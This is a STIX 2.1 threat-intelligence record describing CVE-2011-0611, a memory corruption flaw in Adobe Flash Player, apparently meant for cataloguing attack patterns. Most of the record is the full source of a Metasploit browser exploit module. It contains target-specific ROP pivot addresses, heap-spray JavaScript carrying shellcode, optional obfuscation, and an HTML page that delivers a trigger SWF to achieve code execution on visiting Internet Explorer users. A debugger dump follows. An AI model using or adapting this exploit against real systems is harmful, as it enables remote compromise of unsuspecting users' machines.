{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2141af7c-75e1-49a6-b347-24ddc1b921fa",
    "created": "2024-08-14T16:40:03.72492Z",
    "modified": "2024-08-14T16:40:03.724925Z",
    "name": "\"Adobe Flash Player 10.2.153.1 SWF Memory Corruption Vulnerability\"",
    "description": " This module exploits a vulnerability in Adobe Flash Player that was discovered and has been exploited actively in the wild.  By embedding a specially crafted .swf file, Adobe Flash crashes due to an invalid use of an object type, which allows attackers to overwrite a pointer in memory, and results arbitrary code execution. Please note for IE 8 targets, Java Runtime Environment must be available on the victim machine in order to work properly.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flashplayer_flash10o.rb",
            "external_id": "adobe_flashplayer_flash10o.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0611"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb11-07.html"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/b/mmpc/archive/2011/04/12/analysis-of-the-cve-2011-0611-adobe-flash-player-vulnerability-exploitation.aspx"
        },
        {
            "source_name": "reference",
            "url": "http://contagiodump.blogspot.com/2011/04/apr-8-cve-2011-0611-flash-player-zero.html"
        },
        {
            "source_name": "reference",
            "url": "http://bugix-security.blogspot.com/2011/04/cve-2011-0611-adobe-flash-zero-day.html"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20110417154057/http://secunia.com:80/blog/210/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Adobe Flash Player 10.2.153.1 SWF Memory Corruption Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability in Adobe Flash Player that was discovered,\n        and has been exploited actively in the wild.  By embedding a specially crafted .swf\n        file, Adobe Flash crashes due to an invalid use of an object type, which allows\n        attackers to overwrite a pointer in memory, and results arbitrary code execution.\n        Please note for IE 8 targets, Java Runtime Environment must be available on the\n        victim machine in order to work properly.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sinn3r',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-0611' ],\n          [ 'OSVDB', '71686' ],\n          [ 'BID', '47314' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb11-07.html' ],\n          [ 'URL', 'http://blogs.technet.com/b/mmpc/archive/2011/04/12/analysis-of-the-cve-2011-0611-adobe-flash-player-vulnerability-exploitation.aspx' ],\n          [ 'URL', 'http://contagiodump.blogspot.com/2011/04/apr-8-cve-2011-0611-flash-player-zero.html' ],\n          [ 'URL', 'http://bugix-security.blogspot.com/2011/04/cve-2011-0611-adobe-flash-zero-day.html' ],\n          [ 'URL', 'http://web.archive.org/web/20110417154057/http://secunia.com:80/blog/210/' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'         => \"process\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'IE 6 on Windows XP SP3',\n            {\n              'Rop'     => false,\n              'Pivot'   => nil,         #No ROP no pivot\n              'Offset1' => '0x01',      #For aligning the payload\n              'Offset2' => '0x02',      #For aligning the CALL\n              'Max1'    => '0x150',     #First spray\n              'Max2'    => '0x200'      #Second spray\n            }\n          ],\n          [\n            'IE 7 on Windows XP SP3',\n            {\n              'Rop'     => false,\n              'Pivot'   => nil,         #No ROP no pivot\n              'Offset1' => '0x01',      #For aligning the payload\n              'Offset2' => '0x02',      #For aligning the CALL\n              'Max1'    => '0x150',     #First spray\n              'Max2'    => '0x200'      #Second spray\n            }\n          ],\n          [\n            'IE 8 on Windows XP SP3',\n            {\n              'Rop'     => true,\n              'Pivot'   => 0x7c348b05,  #XCHG EAX,ESP; RETN (MSVCR71.dll)\n              'Offset1' => '0x5E2',     #Offset for rop+payload\n              'Offset2' => '0x02',      #Offset to 0x11111110\n              'Max1'    => '0x250',     #First spray\n              'Max2'    => '0x200'      #Second spray\n            }\n          ],\n          [\n            'IE 7 on Windows Vista',\n            {\n              'Rop'     => false,\n              'Pivot'   => nil,         #No ROP no pivot\n              'Offset1' => '0x01',      #For aligning the payload\n              'Offset2' => '0x02',      #For aligning the CALL\n              'Max1'    => '0x150',     #First spray\n              'Max2'    => '0x200'      #Second spray\n            }\n          ],\n          [\n            'IE 8 on Windows 7',\n            {\n              'Rop'     => true,\n              'Pivot'   => 0x7c348b05,  #XCHG EAX,ESP; RETN (MSVCR71.dll)\n              'Offset1' => '0x5F4',     #Offset for rop+payload\n              'Offset2' => '0x02',      #Offset to 0x11111110\n              'Max1'    => '0x101',     #First spray\n              'Max2'    => '0x300'      #Second spray\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-04-11',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', true])\n      ], self.class\n    )\n\n  end\n\n  def exploit\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2011-0611.swf\")\n    f = File.open(path, \"rb\")\n    @trigger = f.read(f.stat.size)\n    f.close\n    super\n  end\n\n  def get_target(request)\n    agent = request.headers['User-Agent']\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/\n      #Windows XP SP3 + IE 6.0\n      return targets[1]\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\n      #Windows XP SP3 + IE 7.0\n      return targets[2]\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/\n      #Windows XP SP3 + IE 8.0 + JRE6\n      return targets[3]\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7\\.0/\n      #Windows Vista + IE 7\n      return targets[4]\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8\\.0/\n      #Windows 7 + IE 8 + JRE6\n      return targets[5]\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n    #Set default target\n    my_target = target\n\n    #If user chooses automatic target, we choose one based on user agent\n    if my_target.name =~ /Automatic/\n      my_target = get_target(request)\n      if my_target.nil?\n        print_error(\"Sending 404 for unknown user-agent\")\n        send_not_found(cli)\n        return\n      end\n      vprint_status(\"Target selected: #{my_target.name}\")\n    end\n\n    vprint_status(\"URL: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      #Browser requests our trigger file, why not\n      print_status(\"Sending trigger SWF...\")\n      send_response(cli, @trigger, {'Content-Type'=>'application/x-shockwave-flash'} )\n      return\n    end\n\n    #Targets that don't need ROP\n    pivot  = \"\\xb8\\x0c\\x0c\\x0c\\x0c\"  #MOV EAX,0x0c0c0c0c\n    pivot << \"\\xff\\xe0\"              #JMP EAX\n    pivot << \"\\x41\"                  #Pad\n\n    #Targets that need ROP\n    if my_target['Rop']\n      #Target Addr=0x11111110\n      pivot =\n      [\n        0x0c0c0c0c,          # Padding. Value for ESP after the XCHG pivot\n        my_target['Pivot'],  # ROP Pivot\n        0x7c346b52,          # EAX (POP ESP; RETN)\n      ].pack('V*')\n\n      #Target Addr=0x0c0c0c0c\n      p = generate_rop_payload('java', payload.encoded)\n    else\n      p = payload.encoded\n    end\n\n    arch = Rex::Arch.endian(my_target.arch)\n\n    shellcode = Rex::Text.to_unescape(p, arch)\n    pivot = Rex::Text.to_unescape(pivot, arch)\n\n    #Extract string based on target\n    if my_target.name == 'IE 8 on Windows 7'\n      js_extract_str = \"var block = shellcode.substring(0, (0x7ff00-6)/2);\"\n    elsif my_target.name == 'IE 8 on Windows XP SP3'\n      js_extract_str = \"var block = shellcode.substring(2, (0x40000-0x21)/2);\"\n    else\n      js_extract_str = \"var block = shellcode.substring(0, (0x80000-6)/2);\"\n    end\n\n    randnop = rand_text_alpha(rand(100) + 1)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4)\n\n    js = <<-JS\n    function heap_spray(heaplib, nops, code, offset, max) {\n      while (nops.length < 0x2000) nops += nops;\n      var offset = nops.substring(0, offset);\n      var shellcode = offset + code + nops.substring(0, 0x2000-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      #{js_extract_str}\n      heaplib.gc();\n      for (var i=1; i<max; i++) {\n        heaplib.alloc(block);\n      }\n    }\n\n    var heap_obj = new heapLib.ie(0x20000);\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    var code = unescape(\"#{shellcode}\");\n    heap_spray(heap_obj, nops, code, #{my_target['Offset1']}, #{my_target['Max1']});\n    var fake_pointers = unescape(\"#{pivot}\");\n    heap_spray(heap_obj, fake_pointers, fake_pointers, #{my_target['Offset2']}, #{my_target['Max2']});\n    JS\n\n    js = heaplib(js, {:noobfu => true} )\n\n    #Javascript obfuscation is optional\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    trigger_file_name = \"#{get_resource}/#{rand_text_alpha(rand(3))}.swf\"\n\n    html = <<-EOS\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"0\" height=\"0\"\n    codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\">\n    <param name=\"movie\" value=\"#{trigger_file_name}\" />\n    <embed src=\"#{trigger_file_name}\" quality=\"high\" type=\"application/x-shockwave-flash\"\n    pluginspage=\"http://www.macromedia.com/go/getflashplayer\">\n    </embed>\n    </body>\n    </html>\n    EOS\n\n    html = html.gsub(/^ {4}/, \"\")\n\n    print_status(\"Sending HTML to...\")\n    send_response(cli, html, {'Content-Type' => \"text/html\"} )\n  end\nend\n\n\n=begin\n0:000> r\neax=11111110 ebx=00000000 ecx=01d650b0 edx=00000007 esi=0013c2f0 edi=01d650b0\neip=100d01f6 esp=0013c12c ebp=0013c230 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00050202\nFlash10o+0xd01f6:\n100d01f6 ff5008          call    dword ptr [eax+8]    ds:0023:11111118=????????\n0:000> dd ecx\n01d650b0  11111110 00000000 00000000 00000000\n01d650c0  00000000 00000000 00000000 00000000\n01d650d0  00000000 00000000 00000000 00000000\n01d650e0  00000000 00000000 00000000 00000000\n01d650f0  00000000 00000000 00000000 00000000\n01d65100  00000000 00000000 00000000 00000000\n01d65110  00000000 00000000 00000000 00000000\n01d65120  00000000 00000000 00000000 00000000\n\n=end\n",
    "x_mitre_disclosure_date": "2011-04-11",
    "x_mitre_platforms": [
        "win'"
    ]
}